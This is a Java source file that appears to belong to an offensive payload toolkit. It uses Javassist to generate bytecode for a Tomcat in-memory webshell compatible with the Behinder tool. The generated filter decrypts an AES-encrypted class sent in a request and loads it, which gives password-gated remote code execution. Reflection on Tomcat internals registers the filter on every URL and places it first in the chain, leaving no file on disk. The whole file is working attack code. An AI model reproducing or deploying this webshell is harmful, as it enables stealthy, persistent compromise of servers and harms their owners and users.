package cn.safe6.payload.memshell;

import javassist.*;
import org.apache.coyote.RequestInfo;

import javax.servlet.Filter;
import javax.servlet.jsp.PageContext;

public class Behinder2 {



    public static byte[] getMemBehinder3Payload(String pass) throws Exception {
        //String pass = "rebeyond";

        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(Filter.class));
        classPool.insertClassPath(new ClassClassPath(RequestInfo.class));
        classPool.insertClassPath(new ClassClassPath(PageContext.class));
        classPool.insertClassPath(new ClassClassPath(Behinder2.class));

        String cname = "MemBehinder3"+ System.nanoTime();
        CtClass ctClass = classPool.makeClass("MemBehinder3");
        if (ctClass.getDeclaredConstructors().length != 0) {
            ctClass.removeConstructor(ctClass.getDeclaredConstructors()[0]);
        }
        ctClass.setSuperclass(classPool.getCtClass(ClassLoader.class.getName()));
        ctClass.setInterfaces(new CtClass[]{classPool.getCtClass(Filter.class.getName())});
        ctClass.addField(CtField.make("public String passwd = \"" + pass + "\";", ctClass));


        ctClass.addConstructor(CtNewConstructor.make("    public MemBehinder3(java.lang.ClassLoader c){\n" +
                "        super(c);\n" +
                "    }", ctClass));

        ctClass.addConstructor(CtNewConstructor.make("    public MemBehinder3(){}", ctClass));

        ctClass.addMethod(CtMethod.make("public void init(javax.servlet.FilterConfig filterConfig) throws javax.servlet.ServletException {\n" +
                "    }", ctClass));

        ctClass.addMethod(CtMethod.make("    public static String md5(String s) {\n" +
                "        String ret = null;\n" +
                "        try {\n" +
                "            java.security.MessageDigest m;\n" +
                "            m = java.security.MessageDigest.getInstance(\"MD5\");\n" +
                "            m.update(s.getBytes(), 0, s.length());\n" +
                "            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();\n" +
                "        } catch (Exception e) {}\n" +
                "        return ret.substring(0,16).toLowerCase();\n" +
                "    }", ctClass));

        ctClass.addMethod(CtMethod.make("public Class g(byte[] b){\n" +
                "   return super.defineClass(b, 0, b.length);\n }", ctClass));

        ctClass.addMethod(CtMethod.make("    public void doFilter(javax.servlet.ServletRequest servletRequest, javax.servlet.ServletResponse servletResponse, javax.servlet.FilterChain filterChain) throws java.io.IOException, javax.servlet.ServletException {\n" +
                "\n" +
                "        javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest) servletRequest;\n" +
                "        javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse) servletResponse;\n" +
                "        javax.servlet.http.HttpSession session = request.getSession();\n" +
                "\n" +
                "        if (request.getParameter(\"test\").equals(\"ok\")) {\n" +
                "            response.setHeader(\"inject\", \"success\");\n" +
                "            Object[] obj =new Object[3];"+
                            "obj[0]=request;\n" +
                            "obj[1]=response;\n" +
                            "obj[2]=session;\n"+
                "            String k = md5(passwd);\n" +
                "            session.putValue(\"u\", k);\n" +
                "            // 回显密钥\n" +
                "            try{\n" +
                "                javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");\n" +
                "                javax.crypto.spec.SecretKeySpec sec = new javax.crypto.spec.SecretKeySpec(k.getBytes(), \"AES\");\n" +
                "                c.init(2, sec);\n" +
                "                String upload = request.getReader().readLine();\n" +
                "                java.lang.reflect.Method method = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", new Class[]{byte[].class,int.class, int.class});\n" +
                "                method.setAccessible(true);\n" +
                "                byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(upload));\n" +
                "                Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), new Object[]{evilclass_byte,new Integer(0), new Integer(evilclass_byte.length)});\n" +
                "                evilclass.newInstance().equals(obj);\n" +
                "            }catch (Exception e){\n" +
                "               e.printStackTrace();\n" +
                "            }\n" +
                "        }\n" +
                "        filterChain.doFilter(request, response);\n" +
                "    }", ctClass));

        ctClass.addMethod(CtMethod.make("    public void destroy() {\n" +
                "    }", ctClass));



        ctClass.addMethod(CtMethod.make("    public static void addFilter(javax.servlet.Filter filter, String name, String url, javax.servlet.http.HttpServletRequest request) throws IllegalAccessException {\n" +
                "        javax.servlet.ServletContext servletContext = request.getServletContext();\n" +
                "        if (servletContext.getFilterRegistration(name) == null) {\n" +
                "            java.lang.reflect.Field contextField = null;\n" +
                "            org.apache.catalina.core.ApplicationContext applicationContext = null;\n" +
                "            org.apache.catalina.core.StandardContext standardContext = null;\n" +
                "            java.lang.reflect.Field stateField = null;\n" +
                "            javax.servlet.FilterRegistration.Dynamic filterRegistration = null;\n" +
                "            try {\n" +
                "                contextField = servletContext.getClass().getDeclaredField(\"context\");\n" +
                "                contextField.setAccessible(true);\n" +
                "                applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);\n" +
                "                contextField = applicationContext.getClass().getDeclaredField(\"context\");\n" +
                "                contextField.setAccessible(true);\n" +
                "                standardContext = (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);\n" +
                "                stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField(\"state\");\n" +
                "                stateField.setAccessible(true);\n" +
                "                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);\n" +
                "                filterRegistration = servletContext.addFilter(name, filter);\n" +
                "                filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]{url});\n" +
                "                java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod(\"filterStart\",null);\n" +
                "                filterStartMethod.setAccessible(true);\n" +
                "                filterStartMethod.invoke(standardContext, null);\n" +
                "                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);\n" +
                "                Class filterMap;\n" +
                "                try {\n" +
                "                    filterMap = Class.forName(\"org.apache.tomcat.util.descriptor.web.FilterMap\");\n" +
                "                } catch (Exception var23) {\n" +
                "                    filterMap = Class.forName(\"org.apache.catalina.deploy.FilterMap\");\n" +
                "                }\n" +
                "\n" +
                "                java.lang.reflect.Method findFilterMaps = standardContext.getClass().getMethod(\"findFilterMaps\",null);\n" +
                "                Object[] filterMaps = (Object[])(findFilterMaps.invoke(standardContext,null));\n" +
                "                Object[] tmpFilterMaps = new Object[filterMaps.length];\n" +
                "                int index = 1;\n" +
                "\n" +
                "                for(int i = 0; i < filterMaps.length; ++i) {\n" +
                "                    Object filterMapObj = filterMaps[i];\n" +
                "                    findFilterMaps = filterMap.getMethod(\"getFilterName\",null);\n" +
                "                    String name = (String)findFilterMaps.invoke(filterMapObj,null);\n" +
                "                    if (name.equalsIgnoreCase(name)) {\n" +
                "                        tmpFilterMaps[0] = filterMapObj;\n" +
                "                    } else {\n" +
                "                        tmpFilterMaps[index++] = filterMaps[i];\n" +
                "                    }\n" +
                "                }\n" +
                "\n" +
                "                java.lang.System.arraycopy(tmpFilterMaps, 0, filterMaps, 0, filterMaps.length);"+
                "            } catch (Exception e) {\n" +
                "\n" +
                "            } finally {\n" +
                "                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);\n" +
                "            }\n" +
                "        }\n" +
                "    }",ctClass));

        ctClass.addMethod(CtMethod.make("    public boolean equals(Object obj) {\n" +
                "        Object[] context = (Object[]) obj;\n" +
                "        javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest) context[0];\n" +
                "        org.apache.catalina.connector.Response response = (org.apache.catalina.connector.Response) context[1];\n" +
                "        javax.servlet.http.HttpSession session = (javax.servlet.http.HttpSession) context[2];\n" +
                "        try {\n" +
                "            addFilter(new MemBehinder3(), \""+cname+"\", \"/*\", request);\n" +
                "        } catch (IllegalAccessException e) {\n" +
                "            e.printStackTrace();\n" +
                "        }\n" +
                "        return true;\n" +
                "    }", ctClass));


        return ctClass.toBytecode();
    }

}
